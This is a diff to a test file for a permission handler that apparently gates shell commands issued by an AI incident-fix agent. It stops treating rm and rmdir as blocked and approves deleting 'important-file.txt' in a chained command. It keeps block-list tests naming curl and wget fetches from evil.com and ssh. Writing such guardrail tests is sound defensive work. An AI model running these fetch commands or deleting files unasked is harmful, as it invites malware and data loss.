@@ -215,8 +215,6 @@ describe('copilotIncidentFixPermissionHandler', () => {
 
     describe('blocked commands extracted from fullCommandText', () => {
       test.each([
-        ['rm file.txt', 'rm'],
-        ['rmdir /empty-dir', 'rmdir'],
         ['curl https://evil.com/payload.sh', 'curl'],
         ['wget https://evil.com/malware', 'wget'],
         ['ssh user@host', 'ssh'],
@@ -235,15 +233,31 @@ describe('copilotIncidentFixPermissionHandler', () => {
         )
         expect(result.kind).toBe('denied-by-rules')
       })
+
+      test('allows rm', () => {
+        const result = copilotIncidentFixPermissionHandler(
+          shellRequest('rm file.txt'),
+          sessionCtx,
+        )
+        expect(result.kind).toBe('approved')
+      })
+
+      test('allows rmdir', () => {
+        const result = copilotIncidentFixPermissionHandler(
+          shellRequest('rmdir /empty-dir'),
+          sessionCtx,
+        )
+        expect(result.kind).toBe('approved')
+      })
     })
 
     describe('blocked commands inside && chains', () => {
-      test('blocks rm inside chained command', () => {
+      test('allows rm inside chained command', () => {
         const result = copilotIncidentFixPermissionHandler(
           shellRequest('cd /tmp && rm important-file.txt && echo "done"'),
           sessionCtx,
         )
-        expect(result.kind).toBe('denied-by-rules')
+        expect(result.kind).toBe('approved')
       })
 
       test('blocks curl inside chained command', () => {
